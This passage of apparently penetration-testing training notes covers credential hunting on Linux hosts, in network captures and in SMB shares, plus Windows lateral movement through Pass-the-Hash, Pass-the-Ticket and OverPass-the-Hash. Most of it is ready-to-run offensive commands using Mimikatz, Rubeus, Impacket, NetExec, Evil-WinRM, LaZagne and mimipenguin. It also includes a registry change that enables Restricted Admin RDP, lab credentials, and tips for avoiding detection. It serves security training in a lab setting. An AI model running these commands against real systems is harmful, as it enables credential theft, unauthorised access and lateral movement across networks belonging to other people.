for l in ".sql .db .*db .db*"; do
  echo -e "\nDB File extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

**Notes** (`.txt` and extension-less files):

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Scripts** (`.py`, `.sh`, `.pl`, `.go`, `.jar`, `.c`) — one of the most dangerous places, since admins often hardcode credentials for automation:

```bash
for l in ".py .pyc .pl .go .jar .c .sh"; do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
grep -Ri "password\|passwd\|pwd\|user\|key\|token\|secret" /path/to/folder 2>/dev/null
```

**Cronjobs** — scheduled scripts sometimes embed credentials:

```bash
cat /etc/crontab
ls -la /etc/cron.*/
```

```
/etc/crontab
/etc/cron.d/
/etc/cron.daily/  /etc/cron.hourly/  /etc/cron.weekly/  /etc/cron.monthly/
```

Any script running as root deserves a close look.

### 2. History files

People accidentally type passwords straight into commands:

```
mysql -u root -pPassword123
sshpass -p 'password' ssh user@host
curl http://site/api?token=...
```

Files to check: `.bash_history`, `.bashrc`, `.bash_profile`, `.zsh_history`, `.mysql_history`, `.python_history`.

Example — a leaked token found in history:

```
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
```

### 3. Log files

```
/var/log/auth.log      # Debian/Ubuntu authentication logs
/var/log/secure        # RHEL/CentOS authentication logs
/var/log/syslog
/var/log/messages
/var/log/faillog
/var/log/cron
/var/log/apache2/  /var/log/httpd/  /var/log/mysql/
```

Keywords: `accepted`, `failed`, `failure`, `ssh`, `sudo`, `COMMAND=`, `password changed`, `new user`, `session opened`, `session closed`.

```bash
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" "$i" 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: $i"
    grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" "$i" 2>/dev/null
  fi
done
```

### 4. Memory / Cache

`mimipenguin` (a Mimikatz-like tool for Linux) can pull credentials out of memory. Requires root:

```bash
sudo python3 mimipenguin.py
```

### 5. LaZagne on Linux

```bash
sudo python3 laZagne.py all
```

💡 **Clarified:** older LaZagne releases require Python 2.7 specifically; newer releases support Python 3 — check which version you downloaded before running it.

Can pull creds from WiFi/`wpa_supplicant`, Firefox/Chromium, Thunderbird, Git, SSH, AWS, Docker, KeePass, `/etc/shadow`, keyrings, FileZilla.

### 6. Browser credentials

Firefox saves logins at:

```
~/.mozilla/firefox/<profile>/logins.json
```

Find the profile:

```bash
ls -l ~/.mozilla/firefox/ | grep default
```

View it (still encrypted at this point):

```bash
cat ~/.mozilla/firefox/<profile>/logins.json | jq .
```

Decrypt with `firefox_decrypt.py`:

```bash
python3 firefox_decrypt.py
```

or with LaZagne:

```bash
python3 laZagne.py browsers
```

### 🔧 Practical checklist for a lab box

```
1. Confirm who you are and what you can access (id, sudo -l)
2. Check /home for notes and shell history
3. Search config files
4. Search scripts
5. Check cronjobs
6. Search local databases
7. Check logs (if permitted)
8. Look for SSH keys
9. Check browser-saved credentials
10. Run LaZagne / mimipenguin if applicable
```

---

## 16. Credential Hunting in Network Traffic

Given a capture file (e.g. `demo.pcapng`), the goal is to spot credentials sent over **unencrypted** protocols:

```
HTTP instead of HTTPS
FTP instead of SFTP
POP3 instead of POP3S
IMAP instead of IMAPS
SMTP instead of SMTPS
SNMP v1/v2 instead of SNMPv3
LDAP instead of LDAPS
```

If a service isn't encrypted, credentials can show up in plain text.

### Useful Wireshark filters

| Filter | Purpose |
|---|---|
| `http` | Show unencrypted web traffic |
| `http.request.method == "POST"` | Logins are usually sent as POST |
| `http contains "passw"` | Search packet contents for the string |
| `frame contains "password"` | Search the whole frame, any protocol |
| `ftp` or `tcp.port == 21` | FTP traffic |
| `snmp` | SNMP traffic |
| `ip.addr == 192.168.1.5` | Traffic to/from a specific host |
| `tcp.stream eq 3` | Isolate one specific conversation |

Right-click an interesting packet → **Follow → TCP Stream** to see the full conversation. In FTP you might see:

```
USER admin
PASS admin123
```

### Automating it with Pcredz

```bash
./Pcredz -f demo.pcapng -t -v
```

- `-f <file>` — the pcap to analyze
- `-v` — verbose output
- `-t` — enables additional protocol parsing (check `--help` for the exact current flag set, it has changed across versions)

Pcredz can automatically pull out FTP creds, HTTP Basic creds, HTTP form passwords, SNMP community strings, NTLM hashes, Kerberos hashes, and SMTP/POP/IMAP creds:

```
FTP User: user1
FTP Pass: password123
Found SNMPv2 Community string: public
```

---

## 17. Credential Hunting in Network Shares

Company file shares often contain leftover passwords, credentials, keys, tokens, and config files that employees didn't mean to expose:

```
\\DC01\IT   \\DC01\HR   \\DC01\Finance   \\DC01\Company   \\DC01\SYSVOL   \\DC01\NETLOGON
```

### Keywords and file types to target

Keywords: `passw`, `password`, `user`, `username`, `token`, `secret`, `key`, `cred`, `admin`, `login`

Extensions: `.ini .cfg .conf .env .txt .xlsx .docx .ps1 .bat .xml .json .kdbx`

Suspicious filenames: `config`, `backup`, `passwords`, `creds`, `initial`, `users`, `vpn`, `database`, `db`, `admin`

### Don't search blindly

With thousands of files across many shares, you'll waste hours. Prioritize: **IT**, **SYSVOL**, **NETLOGON**, Admins, Backups, Finance, HR, Dev, Scripts — especially IT/SYSVOL/NETLOGON, since these usually contain scripts, configs, and GPOs.

### Tools

**Snaffler** (from Windows, ideally domain-joined):

```cmd
Snaffler.exe -s
```

It enumerates domain machines, discovers SMB shares, checks what you can read, and scans file contents for sensitive keywords automatically. Output color-coding:

```
Red    = high priority, look now
Yellow = possibly interesting
Green  = readable share
```

⚠️ Expect false positives — not everything flagged as "password" is a real credential.

**PowerHuntShares** (from Windows) — generates a polished HTML report:

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

**MANSPIDER** (from Linux) — remote SMB content search:

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET_IP> -c 'passw' -u '<USER>' -p '<PASS>'
```

Matching files get pulled into a `loot` folder.

**NetExec / nxc** (from Linux):

```bash
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --spider IT --content --pattern "passw"
```

### 🔧 Practical Lab

Given creds: `mendres : Inlanefreight2025!`

```bash
evil-winrm -i 10.129.234.121 -u mendres -p 'Inlanefreight2025!'
# or
xfreerdp /v:10.129.234.121 /u:mendres /p:'Inlanefreight2025!'
```

Tools are pre-staged in `C:\Users\Public`:

```cmd
cd C:\Users\Public
Snaffler.exe -s
```

Watch for hits mentioning `password`, `AdministratorPassword`, `cred`, `secret`, `key`, `token`, `unattend.xml`, `.config`, `.ps1`, `.bat`, `.env` — then run `PowerHuntShares` for a clean written report.

---

## 18. Windows Lateral Movement: Pass the Hash and Pass the Ticket

How to move across a network/domain **without** ever needing a plaintext password.

### Pass the Hash (PtH)

Instead of the real password (`Password123!`), you use the **NTLM hash** itself (`64F12CDDAA88057E06A81B54E73B949B`) to authenticate — Windows NTLM authentication accepts the hash as proof of identity, so cracking it is never actually required.

Hashes usually come from a box you've already compromised: the SAM database, LSASS memory, or NTDS.dit. So PtH is normally a *second* step after initial compromise, not the entry point.

#### Tools

**Mimikatz** (Windows) — spawns a `cmd.exe` running as the target user:

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

**Invoke-TheHash** (PowerShell) — executes commands remotely via SMB or WMI using a hash:

```powershell
Invoke-SMBExec -Target <Target_IP> -Domain <DOMAIN> -Username <USER> -Hash <HASH> -Command "whoami" -Verbose
Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username <USER> -Hash <HASH> -Command "whoami"
```

**Impacket** (Linux):

```bash
impacket-psexec <USER>@<TARGET_IP> -hashes :<HASH>
# also: impacket-wmiexec, impacket-smbexec, impacket-atexec
```

**NetExec / nxc** (Linux) — great for spraying one hash across a whole subnet:

```bash
netexec smb <TARGET_IP/24> -u <USER> -d . -H <HASH>
```

`-d .` (or `--local-auth`) tells the tool to treat the account as a **local** account on each target, not a domain account — critical when checking for **local admin password/hash reuse** across many machines. A `Pwn3d!` result means that user is admin on that box.

Execute a command directly:

```bash
netexec smb <TARGET_IP> -u <USER> -d . -H <HASH> -x whoami
```

**Evil-WinRM** (if WinRM/5985 is open — often the easiest route):

```bash
evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>
evil-winrm -i <TARGET_IP> -u <USER>@<DOMAIN> -H <HASH>
```

**RDP Pass the Hash:**

```bash
xfreerdp3 /v:<TARGET_IP> /u:<USER> /pth:<HASH>
```

Requires **Restricted Admin Mode** enabled on the target — otherwise it'll error out. If you already have a foothold (e.g. via WinRM), you can enable it yourself:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Pass the Ticket (PtT)

In Active Directory there are two related-but-different artifacts:

```
Hash   = a fingerprint of the password
Ticket = an actual Kerberos "access pass" issued after successful authentication
```

- **Pass the Hash** — you have an NTLM hash and use it as a stand-in for the password.
- **Pass the Ticket** — you have an actual Kerberos ticket and load it into your session to access services as the ticket's owner, with no password or hash needed at all.

#### Kerberos in brief

**TGT (Ticket Granting Ticket)** — the "master pass." With a user's TGT you can request tickets for any service they're allowed to reach (SMB, MSSQL, LDAP, PowerShell Remoting, etc.).

**TGS (Ticket Granting Service ticket)** — a ticket scoped to *one specific service* (e.g. `CIFS/DC01` grants SMB access to `DC01` only).

Tickets live in **LSASS**. As a normal user you can only pull your own tickets; as local admin you can pull tickets for *every* logged-on user.

#### Extracting tickets — Mimikatz

```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

Produces `.kirbi` files. Anything with `krbtgt` in the filename is likely a TGT — the most valuable kind:

```
plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Extracting tickets — Rubeus

```
Rubeus.exe dump /nowrap
```

`/nowrap` keeps the Base64 ticket output on one line so it's easy to copy. As admin, Rubeus can pull tickets for other logged-on users too.

### Pass the Key / OverPass the Hash

Instead of stealing an already-issued ticket, you request a **brand-new TGT** using a hash or key you already have:

```
NTLM hash or AES key  →  request a TGT from the domain  →  import the ticket  →  operate as that user
```

Extract Kerberos keys with Mimikatz:

```
sekurlsa::ekeys
```

Yields `aes256_hmac`, `rc4_hmac_nt`, `aes128_hmac`, etc. Prefer **AES** over RC4 when available — using RC4 in a modern environment can look like a Kerberos downgrade and is more likely to get flagged.

Request a TGT with Rubeus:

```
Rubeus.exe asktgt /domain:<Domain> /user:<User> /aes256:<HASH> /nowrap
```

Request **and inject** it directly into the current session with `/ptt` (Pass The Ticket):

```
Rubeus.exe asktgt /domain:<Domain> /user:<User> /rc4:<HASH> /ptt
```

```
Ticket successfully imported!
```

### Using an existing `.kirbi` ticket

```
Rubeus.exe ptt /ticket:ticket.kirbi
```

or with Mimikatz:

```
kerberos::ptt "C:\path\to\ticket.kirbi"
```

Then test access:

```cmd
dir \\DC01.inlanefreight.htb\c$
```

### PowerShell Remoting with a ticket

```powershell
Enter-PSSession -ComputerName DC01
whoami
# inlanefreight\john
```

### Clean sessions with `Rubeus createnetonly`

To avoid disturbing tickets already cached in your current session, spin up a fresh, isolated one:

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Then, from that new `cmd`:

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<HASH> /ptt
```

```powershell
Enter-PSSession -ComputerName DC01
```

---

## 19. Quick-Reference Cheat Sheets

💡 **Added in full** — none of this section existed in the original notes.

### Common Hashcat `-m` modes

| Mode | Hash type |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 900 | MD4 |
| 1000 | NTLM |
| 1800 | sha512crypt / Unix `$6$` |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 9600 | Office 2013+ |
| 13100 | Kerberos 5 TGS-REP etype 23 (Kerberoasting) |
| 18200 | Kerberos 5 AS-REP etype 23 (AS-REP Roasting) |

### Tool cheat sheet

| Task | Tool |
|---|---|
| Crack an offline hash | John the Ripper, Hashcat |
| Identify a hash type | `hashid` |
| Convert a protected file to a crackable hash | `*2john` tools |
| Brute-force a network login | Hydra, NetExec, Metasploit |
| Build a targeted wordlist | CeWL, manual + Hashcat rules |
| Dump local Windows hashes | `reg.exe save` + `secretsdump.py` |
| Dump domain hashes | Volume Shadow Copy + `secretsdump.py`, or `nxc -M ntdsutil` |
| Dump LSASS memory | Task Manager, `comsvcs.dll`, then `pypykatz`/Mimikatz |
| Hunt creds on disk (Windows) | `findstr`, LaZagne, Windows Search |
| Hunt creds on disk (Linux) | `grep`/`find` sweeps, LaZagne, mimipenguin |
| Hunt creds in shares | Snaffler, PowerHuntShares, MANSPIDER, NetExec `--spider` |
| Hunt creds in traffic | Wireshark, Pcredz |
| Move laterally with a hash | Mimikatz, Impacket, NetExec, Evil-WinRM |
| Move laterally with a ticket | Mimikatz, Rubeus |

---

## 20. Defensive Notes and OPSEC Considerations

💡 **Added** — a short blue-team-facing counterpart, since knowing what gets logged/flagged is part of doing this professionally.

- Network-wide password spraying/stuffing against SMB/LDAP/RDP is **noisy** — expect it to show up in SIEM alerts and account-lockout events. Prefer slow, spaced-out spraying with a small, well-chosen password list over fast brute-forcing.
- Dumping LSASS via `comsvcs.dll` or Task Manager is a textbook EDR/AV signature — expect detection on a monitored endpoint.
- Pass-the-Hash and Pass-the-Ticket generate specific, well-known Windows Event IDs (e.g. 4624 logon-type anomalies, 4768/4769 Kerberos events) — defenders hunting for lateral movement watch for exactly these techniques.
- RC4-based Kerberos tickets (as opposed to AES) are a known downgrade indicator many EDRs specifically alert on.
- When credential hunting on a live production system (files/history/logs), remember you're also reading real user data — handle findings according to your engagement's rules of engagement and reporting requirements.
